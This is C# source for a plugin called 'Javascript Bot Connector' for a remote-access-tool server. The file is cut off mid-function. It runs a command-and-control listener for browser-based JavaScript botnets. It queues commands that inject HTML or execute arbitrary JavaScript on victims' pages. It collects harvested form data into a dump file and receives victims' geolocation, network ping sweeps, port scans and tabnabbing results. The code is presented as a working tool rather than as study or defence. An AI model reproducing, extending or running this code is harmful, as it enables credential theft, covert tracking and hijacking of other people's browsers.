using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using sCore;
using System.Net.Sockets;
using sCore.IO;
using System.Windows.Forms;
using System.Net;
using System.Drawing;
using System.IO;

namespace WebPlugin
{
    /// <summary>
    /// Multiple same key allowing dictionary from proxyServer project
    /// </summary>
    public class VDictionary //String only
    {
        List<KeyValuePair<string, string>> kvp = new List<KeyValuePair<string, string>>();
        public IEnumerable<KeyValuePair<string, string>> Items
        {
            get
            {
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    yield return lvp;
                }
            }
        }

        public int Count
        {
            get { return kvp.Count; }
        }

        public List<string> Keys
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Key);
                }

                return temp;
            }
        }

        public List<string> Values
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Value);
                }

                return temp;
            }
        }

        public string this[string index]
        {
            get
            {
                return At(index);
            }

            set
            {
                SetOne(index, value);
            }
        }

        public void SetOne(string key, string newText)
        {
            int i = 0;
            bool canSet = false;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canSet = true;
                    break;
                }
                i++;
            }

            if (canSet) SetByIndex(i, newText);
        }

        public void SetByIndex(int index, string newText)
        {
            kvp[index] = new KeyValuePair<string, string>(kvp[index].Key, newText);
        }

        public void SetByIndex(int[] indicies, string[] newText)
        {
            int loopIndex = 0;
            foreach (int i in indicies)
            {
                SetByIndex(i, newText[loopIndex]);
                loopIndex++;
            }
        }

        public void SetAll(string key, string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    SetOne(key, value);
                }
            }
        }

        /// <summary>
        /// Add's an element into the Dictionary
        /// </summary>
        /// <param name="key">The key of the element (can be a duplicate)</param>
        /// <param name="value">The value of the element (can be a dublicate)</param>

        public void Add(string key, string value)
        {
            KeyValuePair<string, string> current = new KeyValuePair<string, string>(key, value);
            kvp.Add(current);
        }

        /// <summary>
        /// Remove's the first element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element to be removed</param>

        public void RemoveByKey(string key)
        {
            int index = 0;
            bool canRemove = false;
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canRemove = true;
                    break;
                }

                index++;
            }

            if (canRemove) kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's all element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element(s) you want to remove</param>

        public void RemoveAllByKey(string key)
        {
            List<int> temp = new List<int>();
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    temp.Add(index);
                }

                index++;
            }

            if (temp.Count > 0)
            {
                RemoveByIndex(temp.ToArray());
            }
        }

        /// <summary>
        /// Remove's all element from the dictionary
        /// </summary>

        public void Clear()
        {
            kvp.Clear();
        }

        /// <summary>
        /// Remove's an element with the specified index form the dictionary
        /// </summary>
        /// <param name="index">The index of the item you want ot remove</param>

        public void RemoveByIndex(int index)
        {
            kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's multiple items specified by the indices array
        /// </summary>
        /// <param name="indicies">The int array of the element id's which you want to remove</param>

        public void RemoveByIndex(int[] indicies)
        {
            for (int i = 0; i < indicies.Length; i++)
            {
                int cIndex = indicies[i];
                kvp.RemoveAt(cIndex);
                for (int c = i; c < indicies.Length; c++)
                {
                    int lci = indicies[c];
                    if (lci > cIndex)
                    {
                        indicies[c] -= 1;
                    }
                }
            }
        }

        /// <summary>
        /// Read's the first element with the specified key
        /// </summary>
        /// <param name="key">The key of the element</param>
        /// <returns>String value</returns>

        public string At(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    return At(index);
                }

                index++;
            }

            return null;
        }

        /// <summary>
        /// Read's the value of an element based on the index specified
        /// </summary>
        /// <param name="index">Index of the element</param>
        /// <returns>String value</returns>

        public string At(int index)
        {
            if (index >= kvp.Count || kvp.Count == 0) return null;
            string value = kvp[index].Value;
            return value;
        }

        /// <summary>
        /// Read's multiple items with the same key
        /// </summary>
        /// <param name="key">The key of the item(s)</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    yield return At(index);
                }

                index++;
            }
        }

        /// <summary>
        /// Read's multiple items based on the indeicies
        /// </summary>
        /// <param name="indicies">The indicies of the requested values</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(int[] indicies)
        {
            foreach (int i in indicies)
            {
                yield return kvp[i].Value;
            }
        }

        /// <summary>
        /// Read's wheter you have at least one element with the specified key
        /// </summary>
        /// <param name="key">The key of the element you want to search</param>
        /// <returns>True if element with the key is present</returns>

        public bool ContainsKey(string key)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key) return true;
            }

            return false;
        }

        /// <summary>
        /// Read's wheter at least one element with the same value exists
        /// </summary>
        /// <param name="value">The value of the element to search</param>
        /// <returns>True if the value is in at least on of the elements</returns>

        public bool ContainsValue(string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Value == value) return true;
            }

            return false;
        }
    }

    public class JSBotnetMessageEventArgs
    {
        private string _botMessage;
        private string _clientID;
        private Dictionary<string, string> _rawResponse;

        public JSBotnetMessageEventArgs(string botMessage, string clientID, Dictionary<string, string> rawResponse)
        {
            BotMessage = botMessage;
            ClientID = clientID;
            RawResponse = rawResponse;
        }

        public string BotMessage { get { return _botMessage; } private set { _botMessage = value; } }
        public string ClientID { get { return _clientID; } private set { _clientID = value; } }
        public Dictionary<string, string> RawResponse { get { return _rawResponse; } private set { _rawResponse = value; } }
    }

    /// <summary>
    /// Main Plugin Class
    /// </summary>
    public class Class1 : IPluginMain
    {
        #region Global Variables

        //Define plugin variables
        public string ScriptName { get; set; } = "Javascript Bot Connector";
        public Version Scriptversion { get; set; } = new Version(1, 0);
        public string AuthorName { get; set; } = "Advanced Hacking 101";
        public Permissions[] ScriptPermissions { get; set; } = { Permissions.Display };
        public string ScriptDescription { get; set; } = "Provides connection/interaction with Javascript botnets";
        /// <summary>
        /// Socket for http server
        /// </summary>
        private Socket _serverSocket;
        /// <summary>
        /// List of client IDs and last comms date
        /// </summary>
        private Dictionary<string, DateTime> _clientList = new Dictionary<string, DateTime>();
        /// <summary>
        /// Command list for clients to execute
        /// </summary>
        private VDictionary commandPoll = new VDictionary();
        private int reservedIds = 0;
        /// <summary>
        /// If true, admin can't send new commands
        /// </summary>
        private bool blockCommands = false;
        private object pollLock = new object();
        /// <summary>
        /// The currently selected client by the admin
        /// </summary>
        private string currentClient = "";
        /// <summary>
        /// Reference to the output box
        /// </summary>
        private RichTextBox output;
        /// <summary>
        /// Reference to the client selection
        /// </summary>
        private ComboBox peerList;
        /// <summary>
        /// Plugin API access token
        /// </summary>
        private string pluginToken;
        /// <summary>
        /// Indicates if display permissions are given
        /// </summary>
        private bool canDisplay = true;
        /// <summary>
        /// If true threads will stop on the next loop
        /// </summary>
        private bool threadStop = false;
        /// <summary>
        /// Token for api ownership
        /// </summary>
        private string apiToken = "";
        /// <summary>
        /// Index of the default permission checker
        /// </summary>
        private const int pDefault = 0;
        /// <summary>
        /// Index of server control permission checker
        /// </summary>
        private const int pServerControl = 1;
        /// <summary>
        /// Index of command sending permission checker
        /// </summary>
        private const int pJSBot = 2;
        /// <summary>
        /// Delegate for JS Client messages received
        /// </summary>
        /// <param name="e">The message event args</param>
        public delegate void JSBotMessage(JSBotnetMessageEventArgs e);
        /// <summary>
        /// Delegate for returning string arrays
        /// </summary>
        /// <returns>String array</returns>
        public delegate string[] StringArrayReturnDelegate();
        /// <summary>
        /// Event for reading incoming client messages
        /// </summary>
        public event JSBotMessage JSBotnetMessageReceived;
        /// <summary>
        /// A list of tokens allowed to send commands to JS Botnets
        /// </summary>
        private List<string> jsAllowedTokens = new List<string>();

        #endregion

        /// <summary>
        /// Plugin Entry point
        /// </summary>
        public void Main()
        {
            pluginToken = sCore.Integration.Integrate.SetPlugin(this); //Generate token and register plugin
            apiToken = sCore.Utils.ExternalAPIs.CreateOwnerKey(); //Generate api ownership key
            PublishAPI(); //Publish External API Functions
            //Check if display permission is given
            if (!sCore.Integration.Integrate.GrantedEveryPermission(pluginToken, this)) canDisplay = false;
            else canDisplay = true;
            sCore.Integration.MainFunction main = new sCore.Integration.MainFunction(PMain); //Create a new Plugin Main function
            sCore.Integration.Integrate.StartPluginThread(main); //Start the plugin thread
            Console.WriteLine("Init completed"); //Debug message
        }

        /// <summary>
        /// Get a list of connected clients
        /// </summary>
        /// <returns>String array of active online clients</returns>
        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "JSBotnet.GetClients", PermissionCheckerID = 0)]
        public string[] XGetClientList()
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl;

            if (tc.InvokeRequired)
            {
                StringArrayReturnDelegate sard = new StringArrayReturnDelegate(XGetClientList);
                return (string[])tc.Invoke(sard, null);
            }

            return _clientList.Keys.ToArray();
        }

        /// <summary>
        /// Control a specified client
        /// </summary>
        /// <param name="clientID">The ID of the client to control</param>
        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "JSBotnet.ControlClient", PermissionCheckerID = 1)]
        public void XControlClient(string clientID)
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl;

            if (!_clientList.ContainsKey(clientID)) return;

            if (tc.InvokeRequired)
            {
                tc.Invoke(new StringDelegate(XControlClient), new object[] { clientID });
                return;
            }

            currentClient = clientID;
            peerList.SelectedItem = clientID;
        }

        /// <summary>
        /// Send commands to JS Botnets
        /// </summary>
        /// <param name="clientID">The id of the client to send the command to</param>
        /// <param name="command">The command to send to the client</param>
        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "JSBotnet.SendCommand", PermissionCheckerID = 2)]
        public void XSendCommand(string clientID, string command)
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl;

            if (!_clientList.ContainsKey(clientID)) return;

            if (tc.InvokeRequired)
            {
                tc.Invoke(new String2Delegate(XSendCommand), new object[] { clientID, command });
                return;
            }

            TextBox t = new TextBox();
            t.Text = command;
            KeyDownHandler(t, new KeyEventArgs(Keys.Return));
        }

        /// <summary>
        /// Get the full output screen
        /// </summary>
        /// <returns>The output screen text</returns>
        [sCore.Utils.ExternalAPIs.ExternAPI(FunctionName = "JSBotnet.GetOutput", PermissionCheckerID = 0)]
        public string XGetOutput()
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl;

            if (tc.InvokeRequired)
            {
                return (string)tc.Invoke(new StringReturnDelegate(XGetOutput), null);
            }

            return output.Text;
        }

        /// <summary>
        /// Permission Checker Function for command sending to JS Botnets
        /// </summary>
        /// <param name="token">The plugin token of the calling plugin</param>
        /// <returns>True if the plugin has permission, otherwise false</returns>
        public bool JSBotPermission(string token)
        {
            if (jsAllowedTokens.Contains(token)) return true; //The token is already registered

            if (canDisplay) //Ask the admin for approval
            {
                if (sCore.RAT.ServerSettings.ShowMessageBox("Another plugin wants acces to the JS Botnet Plugin Command Send Feature\r\nDo you allow it?", 
                    "Permission Check", MessageBoxButtons.YesNo, MessageBoxIcon.Question, pluginToken) == DialogResult.Yes)
                {
                    jsAllowedTokens.Add(token);
                    return true;
                }
            }
            else Console.WriteLine("Failed to give permission, because can't display a message box (no permission)"); //No display permission (should never reach this)

            return false; //Permission request rejected
        }

        /// <summary>
        /// Generate Permissions And Load Functions For External API Support
        /// </summary>
        private void PublishAPI()
        {
            //Create new permission checks for new API functions
            sCore.Utils.ExternalAPIs.LoadPermissionChecks(apiToken,
                new Predicate<string>((x) => { return true; }),
                new Predicate<string>((x) => { return sCore.Integration.Integrate.CheckPermission(Permissions.ServerControl, x); }),
                JSBotPermission
                );

            sCore.Utils.ExternalAPIs.LoadExternalAPIFunctions(apiToken, typeof(Class1)); //Load the API functions to the bridge
        }

        /// <summary>
        /// Handles selecting clients
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void ItemChangedHandler(object sender, EventArgs e)
        {
            ComboBox cb = (ComboBox)sender; //Get the cbox

            if (cb.SelectedItem != null) //If an item is selected
            {
                currentClient = cb.SelectedItem.ToString(); //Get the current client ID
                output.Clear(); //Clear the output box
            }
        }

        /// <summary>
        /// Handles command sending to clients
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void KeyDownHandler(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return) //If eneter was pressed
            {
                if (blockCommands || currentClient == "") return; //If no client selected or commands are blocked return
                TextBox input = (TextBox)sender; //Get the sender control
                string cmd = input.Text; //Get the command text
                if (cmd == "cls" || cmd == "clear") output.Clear(); //Register local screen clear commands
                //Handle content parsing from specified local files
                if (cmd.StartsWith("append-html ")) //Append html to the end of the page
                {
                    //Parse html content and create command
                    string file = cmd.Substring(12);
                    string html = "";
                    if (File.Exists(file)) html = File.ReadAllText(file);
                    else html = file;
                    html = html.Replace(Environment.NewLine, string.Empty);
                    html = html.Replace("\"", "\\\"");
                    html = html.Replace("\t", string.Empty);
                    html = html.Trim();
                    cmd = "append-html " + html;
                }
                if (cmd.StartsWith("push-html ")) //Replace the site's html content
                {
                    //Parse the html content and create the command
                    string file = cmd.Substring(10);
                    string html = "";
                    if (File.Exists(file)) html = File.ReadAllText(file);
                    else html = file;
                    html = html.Replace(Environment.NewLine, string.Empty);
                    html = html.Replace("\"", "\\\"");
                    html = html.Replace("\t", string.Empty);
                    html = html.Trim();
                    cmd = "push-html " + html;
                }
                if (cmd.StartsWith("execute-js ")) //Execute raw javascript on the remote site
                {
                    //Parse the JS content and create the command
                    string file = cmd.Substring(11);
                    string js = "";
                    if (File.Exists(file)) js = File.ReadAllText(file);
                    else js = file;
                    js = js.Replace(Environment.NewLine, string.Empty);
                    js = js.Replace("\"", "\\\"");
                    js = js.Replace("\t", string.Empty);
                    js = js.Trim();
                    cmd = "execute-js " + js;
                }
                e.SuppressKeyPress = true; //Supress the eneter key
                input.Clear(); //Clear the command text
                commandPoll.Add(currentClient, cmd); //Add the command to the wait list
                if (output != null) output.AppendText("[Server->Client]: " + cmd + Environment.NewLine); //Append command to the output screen
            }
        }

        /// <summary>
        /// Create the UI of the plugin
        /// </summary>
        private void CreateUI()
        {
            TabControl tc = sCore.UI.CommonControls.mainTabControl; //Get the tabControl of the server

            //Invoke if we need to
            if (tc.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(CreateUI);
                tc.Invoke(vd);
                return;
            }

            //Create a tab page for this plugin
            TabPage tp = new TabPage();
            tp.Name = "page_WebExt";
            tp.Text = "JS Control";
            tp.BackColor = SystemColors.Window;

            //Create a client selector
            ComboBox cb = new ComboBox();
            cb.Name = "js_selectClient";
            cb.Text = "Select a client";
            cb.Size = new Size(200, 20);
            cb.Location = new Point(25, 25);
            cb.SelectedIndexChanged += new EventHandler(ItemChangedHandler);
            peerList = cb;

            //Create the label in front of the command box
            Label cmdLabel = new Label();
            cmdLabel.Text = "Command:";
            cmdLabel.Location = new Point(25, 70);
            cmdLabel.AutoSize = true;

            //Create the command box
            TextBox cmdInput = new TextBox();
            cmdInput.Size = new Size(500, 20);
            cmdInput.Location = new Point(100, 68);
            cmdInput.KeyDown += new KeyEventHandler(KeyDownHandler);

            //Create the label in front of the output screen
            Label outputLabel = new Label();
            outputLabel.AutoSize = true;
            outputLabel.Location = new Point(25, 115);
            outputLabel.Text = "Output:";

            //Create the output screen
            RichTextBox outputBox = new RichTextBox();
            outputBox.ReadOnly = true;
            outputBox.BackColor = SystemColors.Control;
            outputBox.Size = new Size(tc.Size.Width - 25 - 50, tc.Size.Height - 190);
            outputBox.Location = new Point(25, 140);
            output = outputBox;

            tp.Controls.AddRange(new Control[] { cb, cmdLabel, cmdInput, outputLabel, outputBox }); //Add the control to the tabpage
            tc.TabPages.Add(tp); //Add the tabpage to the tabControl
        }

        /// <summary>
        /// Server port parsing function with retry
        /// </summary>
        /// <returns>A valid integer for server port</returns>
        private int GetPort()
        {
            //Create a new input box
            Types.InputBoxValue ret = sCore.RAT.ServerSettings.ShowInputBox("Please eneter the server port", "Enter a port for the Bot listener to run on", pluginToken);
            if (ret.dialogResult != DialogResult.OK) return -1; //Result is cancel, return
            int portNumber = -1;
            int.TryParse(ret.result, out portNumber);
            if (portNumber == -1 || portNumber < 0) //Invalid port
            {
                sCore.RAT.ServerSettings.ShowMessageBox("You entered an invalid value", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning, pluginToken); //Notify the admin
                return GetPort(); //Try again
            }
            else return portNumber; //Return the valid integer
        }

        /// <summary>
        /// Message object for async calls
        /// </summary>
        private struct MessageData
        {
            public byte[] buffer; //Receive buffer
            public Socket sender; //Client Socket
        }

        /// <summary>
        /// Async callback for accepting incoming connctions
        /// </summary>
        /// <param name="ar">Async Result</param>
        private void AcceptClient(IAsyncResult ar)
        {
            try
            {
                Console.WriteLine("Client connected!"); //Debug message
                Socket s = _serverSocket.EndAccept(ar); //The connected client
                //Don't log clients in a list, because they will disconnect after the response(HTTP), there is no persistent connection
                MessageData md = new MessageData() //Create a new message object
                {
                    buffer = new byte[1024],
                    sender = s
                };

                s.BeginReceive(md.buffer, 0, md.buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), md); //Begin reading from the botnet client
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to accept client, Reason: " + ex.ToString()); //Accept failed
            }
        }

        /// <summary>
        /// Parse HTTP GET request params
        /// </summary>
        /// <param name="requestString">The HTTP request</param>
        /// <returns>The parsed GET params</returns>
        private Dictionary<string, string> GetRequestParams(string requestString)
        {
            String[] lines = requestString.Split('\n'); //Split the request by new lines
            List<string> reqLines = new List<string>(); //Create a new string list
            Dictionary<string, string> dict = new Dictionary<string, string>(); //Create the param dictionary

            foreach (string line in lines) //Loop through the lines
            {
                reqLines.Add(line.Replace("\r", String.Empty)); //Strip \r from the end and add the lines to the list
            }

            lines = reqLines.ToArray(); //Convert the list back to array
            reqLines.Clear(); //Clear the list
            reqLines = null; //Dereference the list

            string pLine = lines[0]; //Get the first line of the request
            int qPos = pLine.IndexOf('?'); //Get the position of the first question mark
            pLine = pLine.Substring(qPos + 1, pLine.Length - qPos - 1); //Cut until the question mark
            pLine = pLine.Replace(" HTTP/1.1", String.Empty); //Strip the HTTP version from the line
            if (pLine.Contains("&")) //Multiple params
            {
                String[] ps = pLine.Split('&'); //Split the params

                foreach (string p in ps) //Loop through the params
                {
                    String[] param = p.Split('='); //Split to key value pair
                    dict.Add(param[0], param[1]); //Add them to the param list
                }
            }
            else //Only one param
            {
                String[] param = pLine.Split('='); //Split them to key value pair
                dict.Add(param[0], param[1]); //Add them to the param list
            }

            return dict; //Return the param list
        }

        /// <summary>
        /// Get the next command based on clientID
        /// </summary>
        /// <param name="clientID">The id of the client waiting for the next command</param>
        /// <returns>The next command for the client or null if there isn't any</returns>
        private string GetNextCommand(string clientID)
        {
            Monitor.Enter(pollLock); //Lock the command poll object
            if (commandPoll.ContainsKey(clientID)) //Check if there are commands for our client
            {
                string cmd = commandPoll.At(clientID); //Get the first command for the client
                commandPoll.RemoveByKey(clientID); //Remove that command
                Monitor.Exit(pollLock); //Release the command poll lock
                return cmd; //Return the command for the client
            }
            else //There isn't any commands for this client
            {
                Monitor.Exit(pollLock); //Release the lock for the commandPoll
                return null; //Return null;
            }
        }

        /// <summary>
        /// Filters and Removes inactive clients
        /// </summary>
        private void CleanThread()
        {
            while (true)
            {
                if (threadStop) break; //If stop flag is set, then exit the thread

                try
                {
                    List<string> flagged = new List<string>(); //Flagged clients for removal

                    foreach (KeyValuePair<string, DateTime> kvp in _clientList) //Loop through the clients
                    {
                        DateTime cmp = DateTime.Now;
                        TimeSpan diff = cmp - kvp.Value;
                        if (diff.TotalSeconds >= 50) flagged.Add(kvp.Key); //if a client didn't responded in the last 50 seconds, flag it
                    }

                    if (flagged.Count > 0) //inactive clients detected
                    {
                        blockCommands = true; //Block user from issuing commands
                        Monitor.Enter(pollLock); //Lock commandPoll, because a list operation is might be going on in GetNextCommand
                        foreach (string rclient in flagged)
                        {
                            commandPoll.RemoveAllByKey(rclient); //Remove commands tasked for unresponsive clients
                            _clientList.Remove(rclient); //Remove inactive clients from clientList
                            if (currentClient == rclient) DisconnectCurrent(); //if the current client is inactive set the current client to nothing
                        }
                        Monitor.Exit(pollLock); //Release lock, because we no longer manipulate the commandPoll obj
                        while (commandPoll.Count != 0) Thread.Sleep(1000); //wait for active clients to process all commands

                        reservedIds = 0; //reset the reserved ids
                        ClearListClient(); //Remove all client entries from combobox

                        int compareID = int.Parse(flagged[0].Substring(6));

                        foreach (string clientName in _clientList.Keys) //go through all clients
                        {
                            int clientID = int.Parse(clientName.Substring(6));

                            if (!flagged.Contains(clientName) && clientID > compareID) //Filter inactive clients
                            {
                                commandPoll.Add(clientName, "reassign"); //add a command to request new client id to all active clients
                            }
                        }

                        //Clients will now request new client IDs wait 12 seconds for that
                        Thread.Sleep(12000);

                        blockCommands = false; //Let the user issue commands again
                    }

                    Thread.Sleep(5000);
                }
                catch (NullReferenceException ex)
                {
                    Console.WriteLine("Clean Thread error Reason: " + ex.ToString());
                    if (threadStop) break;
                }
            }

            threadStop = false; //Reset the flag, because after the stop it wil stay true.
        }

        /// <summary>
        /// Clear the client list combobox
        /// </summary>
        private void ClearListClient()
        {
            //Invoke if we need to
            if (peerList.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(ClearListClient);
                peerList.Invoke(vd);
                return;
            }

            //Clear the list and reset the selected item
            peerList.Items.Clear();
            peerList.SelectedItem = null;
            peerList.Text = "";
        }

        /// <summary>
        /// Disconnect from current client
        /// </summary>
        private void DisconnectCurrent()
        {
            //Invoke if we need to
            if (output.InvokeRequired)
            {
                VoidDelegate vd = new VoidDelegate(DisconnectCurrent);
                output.Invoke(vd);
                return;
            }

            //Reset the current client and the output screen
            currentClient = "";
            output.Text = "";
        }

        /// <summary>
        /// Add a new client to the client list
        /// </summary>
        /// <param name="clientName">The ID of the client to add</param>
        private void AddListClient(string clientName)
        {
            //Invoke if we need to
            if (peerList.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AddListClient);
                peerList.Invoke(sd, new object[] { clientName });
                return;
            }

            //Add the client to the list
            peerList.Items.Add(clientName);
        }

        /// <summary>
        /// Remove a client from the list
        /// </summary>
        /// <param name="clientName">The ID of the client to remove</param>
        private void RemoveListClient(string clientName)
        {
            //Check if we need to invoke
            if (peerList.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AddListClient);
                peerList.Invoke(sd, new object[] { clientName });
                return;
            }

            //Remove the client from the list
            peerList.Items.Remove(clientName);
        }

        /// <summary>
        /// Async Read from the client
        /// </summary>
        /// <param name="ar">Async Result</param>
        private void ReadCallback(IAsyncResult ar)
        {
            MessageData md = (MessageData)ar.AsyncState; //Get the message object
            int read = md.sender.EndReceive(ar); //Read the message
            Console.WriteLine("Reading from stream " + read.ToString() + " bytes");
            if (read > 0) //If something is read
            {
                //Convert the data to string
                byte[] data = new byte[read];
                Array.ConstrainedCopy(md.buffer, 0, data, 0, read);
                string text = Encoding.ASCII.GetString(data);

                Dictionary<string, string> dict = GetRequestParams(text); //Get the request params
                Dictionary<string, string> d = new Dictionary<string, string>(); //Define the response params

                string cmd = dict["command"]; //Get the client's command
                Console.WriteLine(cmd);

                if (cmd == "register") //Client's first check, it wants to get a client ID
                {
                    Console.WriteLine("In registration");
                    string clientID = "Client" + reservedIds.ToString(); //Get the next available ID
                    _clientList.Add(clientID, DateTime.Now.AddSeconds(1)); //Add 1 second for next poll
                    AddListClient(clientID); //Add the client to the list
                    reservedIds++; //Reserve the current ID
                    d.Add("result", clientID); //Add result, clientID to response params
                    SendResponse(d, md.sender); //Send response
                }
                else if (cmd == "getCommand") //Client wants to get new commands to execute
                {
                    string rcmd = GetNextCommand(dict["client"]); //Get the next queued command for the client
                    if (rcmd == null) rcmd = ""; //No commands for now
                    d.Add("result", rcmd); //Add the command to the response
                    _clientList[dict["client"]] = DateTime.Now; //Update the comm date
                    SendResponse(d, md.sender); //Send response to client
                }
                else if (cmd == "feedback") //Client wants to send feedback, about the result of a long running command
                {
                    string msg = dict["text"]; //Get the feedback text
                    if (currentClient == dict["client"]) AppendResponse(msg); //If the current client sent the feedback, display it
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(msg, dict["client"], dict));
                    d.Add("status", "received"); //Add status to the response
                    SendResponse(d, md.sender); //Send response to client
                }
                else if (cmd == "formData") //Client sends result about a form harvest
                {
                    string client = dict["client"]; //The client, which harvested the form
                    string dump = dict["formDump"]; //The form dump itself
                    string site = dict["site"]; //The site which the form was dumped on
                    dump = Uri.UnescapeDataString(dump); //Convert from URL Encoding
                    site = Uri.UnescapeDataString(site); //Convert from URL Encoding

                    string format = client + " - " + site + Environment.NewLine + dump + Environment.NewLine; //Create a data string
                    WriteFormData(format); //Store the form data
                    d.Add("sample", "sample"); //Add some params to the response
                    SendResponse(d, md.sender); //Send response to client
                }
                else if (cmd == "storeLocation") //Client sends result of geolocation
                {
                    string client = dict["client"]; //The client which geolocated the browser
                    //Create and Display the message
                    string message = "200 Success on requeting geolocation\r\n" + client + " responded with: lat:" + dict["latitude"] + "; lng: " + dict["longitude"];
                    AppendResponse(message);
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(message, dict["client"], dict));
                    //Respond to client
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "errorLocation") //The client send result of a failed geolocation attempt
                {
                    string client = dict["client"]; //The client which failed the geolocation
                    //Create and Display message
                    string message = "404 Geolocation failed on target!\r\n" + client + "Responded with: " + dict["message"];
                    AppendResponse(message);
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(message, dict["client"], dict));
                    //Respond to client
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "pingResult") //Client sends the result of a ping sweep on the network
                {
                    string client = dict["client"]; //The client which executed the ping sweep
                    //Create and Display message
                    string message = "200 Ping sweep finished on target!\r\n" + client + " Responded with: " + dict["result"];
                    AppendResponse(message);
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(message, dict["client"], dict));
                    //Respond to the client
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "portResult") //Client sends a portscan result
                {
                    string client = dict["client"]; //The client which scanned a port
                    //Create and Display message
                    string message = "200 Port Scan completed\r\n" + client + " responded with: " + dict["message"];
                    AppendResponse(message);
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(message, dict["client"], dict));
                    //Repond to client
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else if (cmd == "tabNabReport") //Client sends the result of a tabnab
                {
                    string client = dict["client"]; //The client which executed tabnab
                    //Create and Display message
                    string message = "200 " + client + " tab nab activated, site changed to: " + dict["site"];
                    AppendResponse(message);
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs(message, dict["client"], dict));
                    //Respond to client
                    d.Add("sample", "sample");
                    SendResponse(d, md.sender);
                }
                else //Invalid client command received
                {
                    JSBotnetMessageReceived?.Invoke(new JSBotnetMessageEventArgs("Invalid Client Command", dict["client"], dict));
                    AppendResponse("Invalid command received.\r\nIgnoring request and continuing tasks");
                }

                try //Try to restart receiving
                {
                    md.buffer = new byte[1024];
                    md.sender.BeginReceive(md.buffer, 0, md.buffer.Length, SocketFlags.None, new AsyncCallback(ReadCallback), md);
                }
                catch (Exception) //Failed to restart receiving, close client socket
                {
                    if (md.sender.Connected) md.sender.Disconnect(false);
                    md.sender.Close();
                    md.sender.Dispose();
                    md.sender = null;
                }
            }
            else //Nothing is read, close the connection socket
            {
                if (md.sender.Connected) md.sender.Disconnect(false);
                md.sender.Close();
                md.sender.Dispose();
                md.sender = null;
            }
        }

        /// <summary>
        /// Write form dump result to a file
        /// </summary>
        /// <param name="fd">The form dump contents</param>
        private void WriteFormData(string fd)
        {
            const string dumpFile = "formDump.txt";
            if (!File.Exists(dumpFile)) File.Create(dumpFile).Close(); //Create the file if needed
            //Append the content to the file
            string fileContent = File.ReadAllText(dumpFile);
            fileContent += fd;
            File.WriteAllText(dumpFile, fileContent);
        }

        /// <summary>
        /// Append text to output screen
        /// </summary>
        /// <param name="response">The text to append</param>
        private void AppendResponse(string response)
        {
            //Check if we need to invoke
            if (output.InvokeRequired)
            {
                StringDelegate sd = new StringDelegate(AppendResponse);
                output.Invoke(sd, new object[] { response });
                return;
            }

            response = Uri.UnescapeDataString(response); //Decode URL encoded chars

            output.AppendText("[Client->Server]: " + response + Environment.NewLine); //Append the text
        }

        /// <summary>
        /// Send HTTP Response to the client's request
        /// </summary>
        /// <param name="dict">The parameter to send</param>
        /// <param name="client">The client socket to send the reponse to</param>
        private void SendResponse(Dictionary<string, string> dict, Socket client)
        {
            string json = "{"; //Create a new string, where we store the JSON data

            foreach (KeyValuePair<string, string> kvp in dict) //Convert the parameters to JSON encoded string
            {
                json += "\"" + kvp.Key + "\": \"" + kvp.Value + "\",";
            }

            //Format the JSON string
            json = json.Substring(0, json.Length - 1);
            json += "}";
            Console.WriteLine("Result JSON: " + json);
            //Construct the response
            byte[] content = Encoding.ASCII.GetBytes(json);
